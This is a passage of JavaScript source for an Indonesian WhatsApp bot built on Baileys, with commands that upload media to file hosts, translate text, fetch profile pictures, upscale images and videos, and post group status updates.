url: pixhost
},
{
name: "Catbox",
url: catbox
},
{
name: "Uguu",
url: uguu
},
{
name: "Supa",
url: supa
},
{
name: "TmpFiles",
url: tmpfiles
},
{
name: "Qu.ax",
url: quax
}
].filter(v => v.url)

if (results.length < 1) {
throw new Error("Semua upload gagal")
}

let cards = []

for (let item of results) {

cards.push({

header: proto.Message.InteractiveMessage.Header.create({

...(await prepareWAMessageMedia(
{
image: { url: ppmenu }
},
{
upload: Putzz.waUploadToServer
}
)),

title: `${item.name}`,
gifPlayback: true,
subtitle: global.namaOwner,
hasMediaAttachment: false

}),

body: {
text:
`*UPLOAD SUCCESS* ✅\n\n` +
`• Server : ${item.name}\n` +
`• User : ${m.pushName}`
},

nativeFlowMessage: {
buttons: [
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
display_text: "Open URL",
url: item.url
})
},
{
name: "cta_copy",
buttonParamsJson: JSON.stringify({
display_text: "Copy Link",
id: "copy_url",
copy_code: item.url
})
}
]
}

})
}

let msg = generateWAMessageFromContent(
m.chat,
{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text:
`*Upload berhasil ✅*\n` +
`Total server : ${results.length}`
},

carouselMessage: {
cards,
messageVersion: 1
}
}
}
}
},
{
quoted: m
}
)

await Putzz.relayMessage(
msg.key.remoteJid,
msg.message,
{
messageId: msg.key.id
}
)

fs.unlinkSync(media)

await Putzz.sendMessage(m.chat, {
react: {
text: "✅",
key: m.key
}
})

} catch (err) {

console.log(err)

ReplyLanz(
`Upload gagal ❌\n\n${err.message}`
)

await Putzz.sendMessage(m.chat, {
react: {
text: "❌",
key: m.key
}
})

}
}
break;

case 'tourlp': {
try{
    if (!/image/.test(mime)) return ReplyLanz(example("dengan kirim/reply foto"))
//	if (!quoted) return ReplyLanz(`Kirim/Reply Media Dengan Caption ${prefix + command}`);
	const quoted = m.quoted ? m.quoted : m
    let media = await Putzz.downloadAndSaveMediaMessage(quoted);
// ✅ semua jenis media masuk (image, video, document, dll)
//		let response = await CatBox(media);
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
const { directLink } = await service.uploadFromBinary(fs.readFileSync(media), `Lanzcihuyy.png`);
const url = directLink.toString()
		let fileSize = (fs.statSync(media).size / 1024).toFixed(2);
		let uploadDate = new Date().toLocaleString();
		let uploader = `${m.pushName}`;
		let caption = `> ᴜᴋᴜʀᴀɴ ғɪʟᴇ : ${fileSize} ᴋʙ\n> ᴘᴇɴɢᴜɴɢɢᴀʜ : ${uploader}`.trim();

		let msg = generateWAMessageFromContent(
			m.chat,
			{
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							body: {
								text: `*sᴜᴅᴀʜ sᴇʟᴇsᴀɪ ${m.pushName} sɪʟᴀʜᴋᴀɴ ᴅɪᴄᴏᴘᴘʏ ʟɪɴᴋɴʏᴀ*`
							},
							carouselMessage: {
								cards: [
									{
										header: proto.Message.InteractiveMessage.Header.create({
											...(await prepareWAMessageMedia(
												{ image: { url: ppmenu } },
												{ upload: Putzz.waUploadToServer }
											)),
											title: '',
											gifPlayback: true,
											subtitle: global.namaOwner,
											hasMediaAttachment: false
										}),
										body: { text: caption },
										nativeFlowMessage: {
											buttons: [
												{
													name: "cta_copy",
													buttonParamsJson: `{"display_text":"Click to get link","id":"123456789","copy_code":"${url}"}`
												}
											],
										},
									},
								],
								messageVersion: 1,
							},
						},
					},
				},
			},
			{ quoted: m }
		);

		await Putzz.relayMessage(msg.key.remoteJid, msg.message, {
			messageId: msg.key.id,
		});

		await fs.unlinkSync(media);

	} catch (err) {
		console.log(err);
		ReplyLanz("Ups, terjadi kesalahan saat mengunggah media. Coba lagi ya! 😅");
	}
}
break;
case 'tourl3': {
    const { fromBuffer } = require('file-type');
    const q = m.quoted || m;
    const mimetype = (q.msg || q).mimetype || q.mediaType || '';
    if (!mimetype) {
        return Putzz.sendMessage(m.chat, {
            text: `Kirim file media dengan caption *${command}*`,
        }, { quoted: qtoko });
    }
    const media = await q.download();
    const tempDir = './temp';
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir);
    const fileName = `media_${Date.now()}${path.extname(mimetype)}`;
    const filePath = path.join(tempDir, fileName);
    fs.writeFileSync(filePath, media);
    const buffer = fs.readFileSync(filePath);
    await Putzz.sendMessage(m.chat, {
        react: { text: '⏳', key: m.key }
    });

    async function uploadToSupa(buffer) {
        try {
            const form = new FormData();
            form.append('file', buffer, 'upload.jpg');
            const res = await axios.post('https://i.supa.codes/api/upload', form, {
                headers: form.getHeaders()
            });
            return res.data?.link || null;
        } catch (error) {
            console.error('Supa Upload Error:', error?.response?.data || error.message);
            return null;
        }
    }

    async function uploadToTmpFiles(filePath) {
        try {
            const buffer = fs.readFileSync(filePath);
            const { ext, mime } = await fromBuffer(buffer);
            const form = new FormData();
            form.append('file', buffer, {
                filename: `${Date.now()}.${ext}`,
                contentType: mime
            });
            const res = await axios.post('https://tmpfiles.org/api/v1/upload', form, {
                headers: form.getHeaders()
            });
            return res.data.data.url.replace('s.org/', 's.org/dl/');
        } catch (error) {
            console.error('TmpFiles Error:', error);
            return null;
        }
    }

    async function uploadToUguu(filePath) {
        try {
            const form = new FormData();
            form.append('files[]', fs.createReadStream(filePath));
            const res = await axios.post('https://uguu.se/upload.php', form, {
                headers: form.getHeaders()
            });
            return res.data.files?.[0]?.url || null;
        } catch (error) {
            console.error('Uguu Upload Error:', error);
            return null;
        }
    }

    async function uploadToFreeImageHost(buffer) {
        try {
            const form = new FormData();
            form.append('source', buffer, 'file');
            const res = await axios.post('https://freeimage.host/api/1/upload', form, {
                params: {
                    key: '6d207e02198a847aa98d0a2a901485a5' 
                },
                headers: form.getHeaders()
            });
            return res.data.image.url;
        } catch (error) {
            console.error('FreeImage.Host Error:', error?.response?.data || error.message);
            return null;
        }
    }

    const [
        supaLink,
        tmpLink,
        uguuLink,
        freeImageHostLink
    ] = await Promise.all([
        uploadToSupa(buffer),
        uploadToTmpFiles(filePath),
        uploadToUguu(filePath),
        uploadToFreeImageHost(buffer),
    ]);
    let msg = `*✅ Upload berhasil ke beberapa layanan:*\n`;
    if (supaLink) msg += `\n🔗 *Supa:* ${supaLink}`;
    if (tmpLink) msg += `\n🔗 *TmpFiles:* ${tmpLink}`;
    if (uguuLink) msg += `\n🔗 *Uguu:* ${uguuLink}`;
    if (freeImageHostLink) msg += `\n🔗 *FreeImage.Host:* ${freeImageHostLink}`;
    await Putzz.sendMessage(m.chat, { text: msg }, { quoted: m });
    await Putzz.sendMessage(m.chat, {
        react: { text: '✅', key: m.key }
    });
    fs.unlinkSync(filePath);
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tr": case "translate": {
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return ReplyLanz(example("id good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return ReplyLanz(example("id good night"))
if (args.length < 1) return ReplyLanz(example("id good night"))
if (!m.quoted.text) return ReplyLanz(example("id good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
ReplyLanz(`${ka}hasil translate${ki}\n`+result[0])
}
} else {
return ReplyLanz(example("id good night"))
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'getpp': {
  let user;
  try {
    if (m.quoted) {
      user = m.quoted.sender;
    } else if (text) {
      const mentioned = text.match(/@(\d{5,})/);
      if (mentioned) {
        user = mentioned[1] + '@s.whatsapp.net';
      } else if (text.includes('62')) {
        const number = text.replace(/[^0-9]/g, '');
        user = number + '@s.whatsapp.net';
      } else {
        throw new Error('Format salah! Gunakan .getpp @tag atau .getpp 628xx');
      }
    } else {
      user = m.sender;
    }
    let pp = await Putzz.profilePictureUrl(user, 'image');
    await Putzz.sendMessage(m.chat, {
      image: { url: pp },
      caption: `Foto profil dari *@${user.split('@')[0]}*`,
      mentions: [user]
    });
  } catch (e) {
    ReplyLanz(e.message || 'Gagal mengambil foto profil! Mungkin tidak ada atau disembunyikan.');
  }
} break;
            case 'getppgc': {
                if (!m.isGroup) return ReplyLanz(mess.OnlyGrup)
                try {
                    avatar = await Putzz.profilePictureUrl(m.chat, "image")
                } catch {
                    avatar = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
                }
                Putzz.sendMessage(m.chat, {
                    image: {
                        url: avatar
                    },
                    caption: `*Action :* Get PP 🔎\n*Result :* Succes ✅\n`
                }, {
                    quoted: qlive
                })
            }
            break
case 'hd2':{ 
if (!/image/.test(mime)) return ReplyLanz('Reply foto')
let media = await Putzz.downloadAndSaveMediaMessage(m.quoted)
let upload = await CatBox(media)
let apis = [ "https://api-faa.my.id/faa/superhd⁠�", "https://api-faa.my.id/faa/hdv2⁠�", "https://api-faa.my.id/faa/hdv3⁠�", "https://api-faa.my.id/faa/hdv4⁠�" ]
let results = []
for (let api of apis) { results.push(`${api}?url=${upload}`) }
await Putzz.sendMessage(m.chat, { image: { url: results[0] }, caption: "HD Result 1" }, { quoted: m })
await Putzz.sendMessage(m.chat, { image: { url: results[1] }, caption: "HD Result 2" }, { quoted: m })
await Putzz.sendMessage(m.chat, { image: { url: results[2] }, caption: "HD Result 3" }, { quoted: m })
await Putzz.sendMessage(m.chat, { image: { url: results[3] }, caption: "HD Result 4" }, { quoted: m }) } break
case 'enhance':
case "hd":
case "remini":
case "enhance": {
try {

const { writeFile, unlink, mkdir } = require("fs").promises;
const { existsSync } = require("fs");
const path = require("path");
const axios = require("axios");
const FormData = require("form-data");
const sharp = require("sharp");

if (!/image/.test(mime)) {
return ReplyLanz(
`⚠️ *Format Penggunaan :*

💬 Contoh :
Reply/Kirim gambar dengan caption
${prefix + command}`
);
}

await Putzz.sendMessage(m.chat, {
react: { text: "🖼️", key: m.key }
});

const quoted = m.quoted ? m.quoted : m;
const buffer = await quoted.download();

/* =========================
   1. API PROCESS (FIRST)
========================= */

const form = new FormData();

form.append("method", "1");
form.append("is_pro_version", "false");
form.append("is_enhancing_more", "false");
form.append("max_image_size", "high");

form.append("file", buffer, {
filename: "image.jpg",
contentType: "image/jpeg"
});

const response = await axios.post(
"https://ihancer.com/api/enhance",
form,
{
headers: form.getHeaders(),
responseType: "arraybuffer"
}
);

const apiResult = Buffer.from(response.data);

/* SAVE TEMP API RESULT */
let tempDir = path.join(__dirname, "tmp");
if (!existsSync(tempDir)) await mkdir(tempDir, { recursive: true });

const apiPath = path.join(tempDir, `api_${Date.now()}.jpg`);
const finalPath = path.join(tempDir, `final_${Date.now()}.jpg`);

await writeFile(apiPath, apiResult);

/* =========================
   2. SHARP PROCESS (AFTER API)
========================= */

await sharp(apiPath)
.resize(1920, 1080, { fit: "inside" })
.modulate({
brightness: 1.08,
saturation: 1.7
})
.linear(1.1, -10)
.sharpen({
sigma: 1.2,
m1: 1.5,
m2: 0.7
})
.gamma(1.05)
.toFile(finalPath);

/* SEND RESULT */
await Putzz.sendMessage(m.chat, {
image: { url: finalPath },
caption: `*HD Image Success* ✅

🧠 API + Sharp Processing Done
> Powered By Mikasa MD`
}, { quoted: m });

await Putzz.sendMessage(m.chat, {
react: { text: "✅", key: m.key }
});

/* CLEANUP */
setTimeout(() => {
unlink(apiPath).catch(() => {});
unlink(finalPath).catch(() => {});
}, 5000);

} catch (err) {

console.error("HD Error:", err?.response?.data || err.message);

await Putzz.sendMessage(m.chat, {
text: `⚠️ Error saat proses image

💡 Detail:
${err?.response?.data?.message || err.message}`
}, { quoted: m });

await Putzz.sendMessage(m.chat, {
react: { text: "❌", key: m.key }
});

}
}
break;
case "hdimg": {
  const { exec } = require("child_process");
  const { writeFile, unlink, mkdir } = require("fs").promises;
  const { existsSync } = require("fs");
  const path = require("path");

  let inputPath, outputPath;

  try {
    let q = m.quoted || m;
    let mime = q.mimetype || q.msg?.mimetype || "";

    if (!mime) return Putzz.sendMessage(m.chat, { text: "❌ Mana fotonya?" }, { quoted: m });

    let imgBuffer = await q.download?.();

    let tempDir = path.join(__dirname, "tmp");
    if (!existsSync(tempDir)) await mkdir(tempDir);

    inputPath = path.join(tempDir, `in_${Date.now()}.jpg`);
    outputPath = path.join(tempDir, `out_${Date.now()}.jpg`);

    await writeFile(inputPath, imgBuffer);

    // AI UPSCALE (2x / 4x)
    exec(`realesrgan-ncnn-vulkan -i ${inputPath} -o ${outputPath} -s 2`, async (err) => {
      if (err) {
        console.error(err);
        return Putzz.sendMessage(m.chat, { text: "❌ AI gagal!" }, { quoted: m });
      }

      await Putzz.sendMessage(m.chat, {
        image: { url: outputPath },
        caption: "🔥 AI HD (GCam style mendekati)"
      }, { quoted: m });
    });

  } catch (e) {
    console.error(e);
    Putzz.sendMessage(m.chat, { text: "❌ Error!" }, { quoted: m });
  }
}
break;
case "hdgr": { 
  try {
    const sharp = require("sharp")
    const fetch = require("node-fetch")

    let q = m.quoted ? m.quoted : m
    let mime = (q.msg || q).mimetype || ""

    if (!mime.startsWith("image/"))
      return ReplyLanz("Reply / kirim gambar!")

    await Putzz.sendMessage(m.chat, {
      react: { text: "⏳", key: m.key }
    })

    // ================= PROSES 0 (DOWNLOAD) =================
    let buffer = await q.download()
    if (!buffer) return ReplyLanz("Gagal membaca gambar")

    // ================= PROSES 1 (AI UPSCALE) =================
    let base64 = buffer.toString("base64")

    let create = await fetch(
      "https://aienhancer.ai/api/v1/r/image-enhance/create",
      {
        method: "POST",
        headers: {
          "User-Agent": "Mozilla/5.0",
          "Content-Type": "application/json",
          "Origin": "https://aienhancer.ai",
          "Referer": "https://aienhancer.ai/ai-image-upscaler"
        },
        body: JSON.stringify({
          model: 3,
          image: `data:image/jpeg;base64,${base64}`,
          settings: "kRpBbpnRCD2nL2RxnnuoMo7MBc0zHndTDkWMl9aW+Gw="
        })
      }
    )

    let createJson = await create.json()
    let taskId = createJson?.data?.id
    if (!taskId) return ReplyLanz("AI gagal membuat task")

    let aiUrl
    for (let i = 0; i < 10; i++) {
      await new Promise(r => setTimeout(r, 2000))

      let res = await fetch(
        "https://aienhancer.ai/api/v1/r/image-enhance/result",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ task_id: taskId })
        }
      )

      let json = await res.json()
      aiUrl = json?.data?.output
      if (aiUrl) break
    }

    if (!aiUrl) return ReplyLanz("AI timeout")

    // ================= PROSES 1.5 (DOWNLOAD AI RESULT) =================
    await sleep(888);
    await Putzz.sendMessage(m.chat, {
      react: { text: "🚀", key: m.key }
    })

    let aiBuffer = await fetch(aiUrl).then(r => r.buffer())

    // ================= PROSES 2 (LOCAL REFINE) =================
    await sleep(1000);
    await Putzz.sendMessage(m.chat, {
      react: { text: "🛠️", key: m.key }
    })

    let finalBuffer = await sharp(aiBuffer)
      .resize({ width: 7680 }) // FINAL SCALE → 8K
      .sharpen(1.6)
      .jpeg({ quality: 95})
      .toBuffer()

    // ================= SEND =================
    await sleep(888);
    await Putzz.sendMessage(
      m.chat,
      {
        image: finalBuffer,
        caption: "✨ done menghd kan 🗿"
      },
      { quoted: m }
    )
    
    await Putzz.sendMessage(m.chat, {
      react: { text: "✅", key: m.key }
    })
  } catch (e) {
    ReplyLanz("Error 8K: " + e.message)
  }
}
break            
            
case 'hd2':
case 'remini2':
case 'upscale2': {
  const fs = require('fs')
  const path = require('path')
  const sharp = require('sharp')
  const ffmpeg = require('fluent-ffmpeg')
  const { downloadContentFromMessage } = require('@whiskeysockets/baileys')

  if (!args[0] || !args[1])
    return ReplyLanz('Format:\n.hd 4k fast\n.remini 8k quality')

  if (!m.quoted || !m.quoted.message)
    return ReplyLanz('Reply foto atau video ASLI!')

  if (m.quoted.fromMe)
    return ReplyLanz('Reply media asli, bukan hasil bot!')
await Putzz.sendMessage(from, { react: { text: "🕐", key: m.key }});
  const scaleMap = { '2k': 2, '4k': 4, '8k': 8 }
  const speedList = ['veryfast', 'fast', 'quality']

  const res = args[0].toLowerCase()
  const speed = args[1].toLowerCase()

  if (!scaleMap[res] || !speedList.includes(speed))
    return ReplyLanz('Resolusi / speed tidak valid')

  const tmp = path.join(__dirname, '../tmp')
  if (!fs.existsSync(tmp)) fs.mkdirSync(tmp)

  async function downloadMedia(msg) {
    const type = Object.keys(msg.message)[0]
    const stream = await downloadContentFromMessage(
      msg.message[type],
      type.replace('Message', '')
    )
    let buffer = Buffer.from([])
    for await (const c of stream) buffer = Buffer.concat([buffer, c])
    return { buffer, type }
  }

  const { buffer, type } = await downloadMedia(m.quoted)
  const tag = Date.now()
  const input = path.join(tmp, `in-${tag}`)
  const output = path.join(tmp, `out-${tag}`)

  // ================= FOTO =================
  if (type === 'imageMessage') {
    fs.writeFileSync(input, buffer)

    await sharp(input)
      .resize({ width: Math.round(1024 * scaleMap[res]) })
      .sharpen(
        speed === 'quality' ? 2.2 :
        speed === 'fast' ? 1.4 : 0.8
      )
      .toFile(output + '.jpg')

    await Putzz.sendMessage(m.chat, {
      image: fs.readFileSync(output + '.jpg'),
      caption: `SUCCESFULLY`
    }, { quoted: m })

    fs.rmSync(input)
    fs.rmSync(output + '.jpg')
    return Putzz.sendMessage(m.chat, { react: { text: '🖼️', key: m.key } })
  }

  // ================= VIDEO =================
  if (type === 'videoMessage') {
    fs.writeFileSync(input + '.mp4', buffer)

    const preset =
      speed === 'veryfast' ? 'ultrafast' :
      speed === 'fast' ? 'fast' : 'slow'

    await new Promise((resolve, reject) => {
      ffmpeg(input + '.mp4')
        .videoFilter(`scale=iw*${scaleMap[res]}:ih*${scaleMap[res]}`)
        .outputOptions([
          `-preset ${preset}`,
          '-crf 20',
          '-pix_fmt yuv420p',
          '-movflags +faststart'
        ])
        .save(output + '.mp4')
        .on('end', resolve)
        .on('error', reject)
    })

    await Putzz.sendMessage(m.chat, {
      video: fs.readFileSync(output + '.mp4'),
      caption: `entahlah`
    }, { quoted: m })

    fs.rmSync(input + '.mp4')
    fs.rmSync(output + '.mp4')
    return Putzz.sendMessage(m.chat, { react: { text: '🎬', key: m.key } })
  }

  return ReplyLanz('Media tidak didukung!')
}
break
            
case 'hvd':
case 'remigni':
case 'upscafle': {
  const fs = require('fs')
  const path = require('path')
  const sharp = require('sharp')
  const ffmpeg = require('fluent-ffmpeg')
  const { downloadContentFromMessage } = require('@whiskeysockets/baileys')

  if (!args[0] || !args[1])
    return ReplyLanz('Format:\n.hd 4k fast\n.remini 8k quality')

  if (!m.quoted || !m.quoted.message)
    return ReplyLanz('Reply foto atau video ASLI!')

  if (m.quoted.fromMe)
    return ReplyLanz('Reply media asli, bukan hasil bot!')

  const scaleMap = { '2k': 2, '4k': 4, '8k': 8 }
  const speedMap = ['veryfast', 'fast', 'quality']

  const res = args[0].toLowerCase()
  const speed = args[1].toLowerCase()

  if (!scaleMap[res] || !speedMap.includes(speed))
    return ReplyLanz('Resolusi / speed tidak valid')

  const tmp = path.join(__dirname, '../tmp')
  if (!fs.existsSync(tmp)) fs.mkdirSync(tmp)

  async function downloadMedia(msg) {
    const type = Object.keys(msg.message)[0]
    const stream = await downloadContentFromMessage(
      msg.message[type],
      type.replace('Message', '')
    )
    let buffer = Buffer.from([])
    for await (const c of stream) buffer = Buffer.concat([buffer, c])
    return { buffer, type }
  }

  const { buffer, type } = await downloadMedia(m.quoted)
  const tag = Date.now()
  const input = path.join(tmp, `in-${tag}`)
  const output = path.join(tmp, `out-${tag}`)

  // ================= FOTO =================
  if (type === 'imageMessage') {
    fs.writeFileSync(input, buffer)

    await sharp(input)
      .resize({ width: Math.round(1024 * scaleMap[res]) })
      .sharpen(
        speed === 'quality' ? 2.2 :
        speed === 'fast' ? 1.4 : 0.8
      )
      .toFile(output + '.png')

    await Putzz.sendMessage(m.chat, {
      document: fs.readFileSync(output + '.png'),
      fileName: `image-LanzOfficial.png`,
      mimetype: 'image/png'
    }, { quoted: m })

    fs.rmSync(input)
    fs.rmSync(output + '.png')
    return Putzz.sendMessage(m.chat, { react: { text: '🖼️', key: m.key } })
  }

  // ================= VIDEO =================
  if (type === 'videoMessage') {
    fs.writeFileSync(input + '.mp4', buffer)

    const preset =
      speed === 'veryfast' ? 'ultrafast' :
      speed === 'fast' ? 'fast' : 'slow'

    await new Promise((resolve, reject) => {
      ffmpeg(input + '.mp4')
        .videoFilter(`scale=iw*${scaleMap[res]}:ih*${scaleMap[res]}`)
        .outputOptions([
          `-preset ${preset}`,
          '-crf 18',
          '-pix_fmt yuv420p'
        ])
        .save(output + '.mp4')
        .on('end', resolve)
        .on('error', reject)
    })

    await Putzz.sendMessage(m.chat, {
      document: fs.readFileSync(output + '.mp4'),
      fileName: `video-LanzOfficial.mp4`,
      mimetype: 'video/mp4'
    }, { quoted: m })

    fs.rmSync(input + '.mp4')
    fs.rmSync(output + '.mp4')
    return Putzz.sendMessage(m.chat, { react: { text: '🎬', key: m.key } })
  }

  return ReplyLanz('Media tidak didukung!')
}
break


case 'txt2img': {
if (!text) return ReplyLanz(`Example: ${prefix + command} cat`)
async function photoleap(prompt) {
    try {
        let result = []
        for (let i = 0; i < 3; i++) {
            let {
                data
            } = await axios.get('https://tti.photoleapapp.com/api/v1/generate?prompt=' + prompt);
            result.push(data.result_url)
        }
        return result
    } catch (e) {
        return ({
            msg: 404
        })
    }
}

let tahu = await photoleap(text)
for (const x of tahu) {
Putzz.sendMessage(m.chat, {image: {url: x}, caption: `Done`}, {quoted: m})
}
}
break
case "upswgc":
case "upsw": {

if (!m.quoted) return ReplyLanz("reply foto / video")

const quoted = m.quoted
const mime = (quoted.msg || quoted).mimetype || ""

if (!/image|video/.test(mime))
   return ReplyLanz("hanya foto / video")

global._grubsw = {
    quoted,
    caption: text || "",
    sender: m.sender
}

const meta = await Putzz.groupFetchAllParticipating()
let list = []

// ===== STATUS PRIBADI =====
list.push({
    title: "📱 Status Pribadi",
    description: "Upload ke status sendiri",
    id: `${prefix}upload_tagwastory status@broadcast`
})

// ===== LIST GRUP =====
for (let id of Object.keys(meta)) {
    list.push({
        title: meta[id].subject,
        description: `${meta[id].participants.length} Member`,
        id: `${prefix}upload_tagwastory ${id}`
    })
}

await Putzz.sendMessage(m.chat,{
    buttons:[{
        buttonId:"action",
        buttonText:{ displayText:"Pilih Tujuan" },
        type:4,
        nativeFlowInfo:{
            name:"single_select",
            paramsJson: JSON.stringify({
                title:"PILIH TARGET STATUS",
                sections:[{
                    title:"LIST TARGET",
                    rows:list
                }]
            })
        }
    }],
    text:"Pilih tujuan upload status",
    footer: botname
},{ quoted:m })

}
break
case "upload_tagwastory": {

if (!global._grubsw) return ReplyLanz("sesi habis")

await reaksi("🕒")

const jid = text.trim()
const { quoted, caption, sender } = global._grubsw

if (sender !== m.sender)
   return ReplyLanz("bukan sesi kamu")

const buffer = await quoted.download()
const mime = (quoted.msg || quoted).mimetype || ""

try {

    // ===== STATUS PRIBADI =====
    if (jid === "status@broadcast") {

        if (/image/.test(mime)) {
            await Putzz.sendMessage("status@broadcast", {
                image: buffer,
                caption
            })
        } else if (/video/.test(mime)) {
            await Putzz.sendMessage("status@broadcast", {
                video: buffer,
                caption
            })
        }

    } else {

        // ===== STATUS GRUP =====
        if (/image/.test(mime)) {
            await Putzz.sendMessage(jid,{
                groupStatusMessage:{
                    image: buffer,
                    caption
                }
            })
        } else if (/video/.test(mime)) {
            await Putzz.sendMessage(jid,{
                groupStatusMessage:{
                    video: buffer,
                    caption
                }
            })
        }
    }

    await Putzz.sendMessage(m.chat,{
        react:{ text:"✅", key:m.key }
    })

} catch(e){
    console.log(e)
    ReplyLanz("❌ gagal upload")
}

delete global._grubsw

}
break
case "swbgrup": case "swggc": {
                const quoted = m.quoted ? m.quoted : m;
                const mime = (quoted.msg || quoted).mimetype || "";
                const caption = m.body.replace(/^\.swgrup\s*/i, "").trim();
                const jid = m.chat;
                
                if (/image/.test(mime)) {
                    const buffer = await quoted.download();
                    await Putzz.sendMessage(jid, {
                        groupStatusMessage: {
                            image: buffer,
                            caption
                        }
                    });
                    ReplyRil("Succes Add Status To Group")
                } else if (/video/.test(mime)) {
                    const buffer = await quoted.download();
                    await Putzz.sendMessage(jid, {
                        groupStatusMessage: {
                            video: buffer,
                            caption
                        }
                    });
                    ReplyRil("Succes Add Status To Group")
                } else if (/audio/.test(mime)) {
                    const buffer = await quoted.download();
                    await Putzz.sendMessage(jid, {
                        groupStatusMessage: {
                            audio: buffer
                        }
                    });
                    ReplyLanz("Succes Add Status To Group")
                } else if (caption) {
                    await Putzz.sendMessage(jid, {
                        groupStatusMessage: {
                            text: caption
                        }
                    });
                    ReplyLanz("Succes Add Status To Group")
                } else {
                    await ReplyLanz(`reply media atau tambahkan teks.\nexample: ${prefix + command} (reply image/video/audio) hai ini saya`);
                }
            }
            break;
            
// ===============================
// CASE 1 — .upswgc / .grubsw
// ===============================
case "upswgc":
case "grubsw": {
    if (!m.quoted) return ReplyLanz("reply foto / video")

    const quoted = m.quoted
    const msg = quoted.msg || quoted
    const mime = msg.mimetype || ""

    const isImage = /image/.test(mime)
    const isVideo = /video/.test(mime)
    const isDocVideo =
        quoted.message?.documentMessage &&
        (
            /video/.test(quoted.message.documentMessage.mimetype || "") ||
            quoted.message.documentMessage.fileName?.endsWith(".mp4")
        )

    if (!isImage && !isVideo && !isDocVideo)
        return ReplyLanz("hanya foto / video")

    global._grubsw = {
        quoted,
        caption: text || "",
        sender: m.sender,
        isImage
    }

    const meta = await Putzz.groupFetchAllParticipating()
    let list = []

    for (let id of Object.keys(meta)) {
        list.push({
            title: meta[id].subject,
            description: `${meta[id].participants.length} Member`,
            id: `upload_tagwastory ${id}`
        })
    }

    await Putzz.sendMessage(
        m.chat,
        {
            buttons: [
                {
                    buttonId: "action",
                    buttonText: { displayText: "PILIH GRUP" },
                    type: 4,
                    nativeFlowInfo: {
                        name: "single_select",
                        paramsJson: JSON.stringify({
                            title: "PILIH GRUP TUJUAN",
                            sections: [
                                {
                                    title: "LIST GRUP",
                                    rows: list
                                }
                            ]
                        })
                    }
                }
            ],
            text: "Silahkan pilih grup tujuan status",
            footer: botname
        },
        { quoted: m }
    )
}
break


// ===================================
// CASE 2 — upload_tagwastory
// ===================================
case "upload_tagwastory": {
    if (!global._grubsw) return ReplyLanz("sesi habis")

    const jid = text.trim()
    const { quoted, caption, sender, isImage } = global._grubsw
    if (sender !== m.sender) return ReplyLanz("bukan sesi kamu")

    const buffer = await quoted.download()

    if (isImage) {
        await Putzz.sendMessage(jid, {
            groupStatusMessage: {
                image: buffer,
                caption
            }
        })
    } else {
        // VIDEO BIASA + DOCU.MP4 DIPAKSA JADI VIDEO
        await Putzz.sendMessage(jid, {
            groupStatusMessage: {
                video: buffer,
                caption
            }
        })
    }

    await Putzz.sendMessage(m.chat, {
        react: { text: "✅", key: m.key }
    })

    delete global._grubsw
}
break
case "upswgc":
            case "swgrup": {
            if (!m.isGroup) return ReplyLanz(mess.group)
            if (!text) return ReplyLanz(` reply foto/vid dengan text ${command} anjay`) 
            if (!isCreator && !isAdmins) return ReplyLanz(mess.admin) 
                const b = "`"
                const quoted = m.quoted ? m.quoted : m;
                const mime = (quoted.msg || quoted).mimetype || "";
                const cmd = m.command || command || 'hd'
                const caption = `> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ʟᴀɴᴢᴇxᴇ \n${b}ᴜᴘʟᴏᴀᴅ${b} ${m.pushName}\n${b}ᴄᴀᴘᴛɪᴏɴ${b} ` + text;
                const jid = m.chat;
                
                if (/image/.test(mime)) {
                    const buffer = await quoted.download();
                    await Putzz.sendMessage(jid, {
                        groupStatusMessage: {
                            image: buffer,
                            caption
                        }
                    });
                        await Putzz.sendMessage(from, {
        react: {
            text: "✅",
            key: m.key
        }
    });
 //                   m.react("✅️")
                } else if (/video/.test(mime)) {
                    const buffer = await quoted.download();
                    await Putzz.sendMessage(jid, {
                        groupStatusMessage: {
                            video: buffer,
                            caption
                        }
                    });
                        await Putzz.sendMessage(from, {
        react: {
            text: "✅",
            key: m.key
        }
    });
//                    m.react("✅️")
                } else if (/audio/.test(mime)) {
                    const buffer = await quoted.download();
                    await Putzz.sendMessage(jid, {
                        groupStatusMessage: {
                            audio: buffer
                        }
                    });
                        await Putzz.sendMessage(from, {
        react: {
            text: "✅",
            key: m.key
        }
    });
//                    m.react("✅️")
                } else if (caption) {
                    await Putzz.sendMessage(jid, {
                        groupStatusMessage: {
                            text: caption
                        }
                    });
                        await Putzz.sendMessage(from, {
        react: {
            text: "✅", key: m.key }});
                } else {
                    await ReplyLanz(`reply media atau tambahkan teks.\nexample: ${prefix + command} (reply image/video/audio) hai ini saya`);
                }
            }
            break;

// use baileys: "@whiskeysockets/baileys": "github:kiuur/baileys",
// m.react also doesn't work, you can just delete it 




case "upswgc2": {
  if (!isOwner && !isAdmins) return ReplyLanz("❌ Perintah ini hanya untuk Admin dan Owner!");

  const quoted = m.quoted ? m.quoted : m;
  const mime = (quoted.msg || quoted).mimetype || "";
  const caption = m.body.replace(/^\.(upswgc\s*)/i, "").trim();
  const jid = m.chat;

  try {
    // ✅ Tambahan cek: pastikan media benar-benar ada
    if (!mime && !caption)
      return ReplyLanz("❌ Tidak ada media atau teks yang bisa diunggah!");

    if (/image/.test(mime)) {
      const buffer = await Putzz.downloadAndSaveMediaMessage(quoted);
      await Putzz.sendMessage(jid, { groupStatusMessage: { image: buffer, caption } });
      ReplyLanz("✅ *Status gambar berhasil diunggah ke grup!*");
    } 
    else if (/video/.test(mime)) {
      const buffer = await Putzz.downloadAndSaveMediaMessage(quoted);
      await Putzz.sendMessage(jid, { groupStatusMessage: { video: buffer, caption } });
